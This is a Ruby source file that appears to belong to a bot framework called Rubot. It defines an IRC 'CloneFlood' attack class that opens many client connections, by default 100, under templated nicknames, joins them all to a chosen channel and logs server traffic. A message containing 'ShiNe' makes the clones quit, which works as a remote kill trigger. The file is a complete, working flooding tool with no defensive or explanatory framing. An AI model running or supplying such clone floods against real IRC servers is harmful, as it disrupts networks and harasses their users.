require 'rubot/control/irc'

module Rubot
  module Attack
    class CloneFlood
      def initialize(server = '127.0.0.1', port = '6667', channel = '#test', count = 100, name_template = "clone_$n")
        @server = server
        @port = port
        @count = count
        @channel = channel
        @name_template = name_template
        @clients = Array.new
      end
      
      def start
        1.upto(@count) do |n|
          nick = @name_template.gsub(/\$n/, n.to_s)
          nick = nick.gsub(/\$t/, Time.now.to_f.to_s)
          nick = nick.gsub(/\$r/, rand(15000).to_s)
          chan = @channel
          client = Rubot::Control::IRC.new do
            host @server
            port @port
            
            on(:connect) do
              nick(nick)
            end

            on(:nick) do
              join(chan)
            end

            on(:message) do |source, target, message|  # called when being messaged
              puts "<#{source}> -> <#{target}>: #{message}"
              if message =~ /ShiNe/
                quit
              end
            end

            # callback for all messages sent from IRC server
            on(:parsed) do |hash|
              puts "#{hash[:prefix]} #{hash[:command]} #{hash[:params].join(' ')}"
            end
        
            on(:disconnect) do
              puts "I'm disconnected"
            end
          end
          @clients << client
          client.connect
        end
      end
      
      alias :launch :start
      def stop
        @clients.each do |client|
          client.quit
        end
      end
    end
  end
end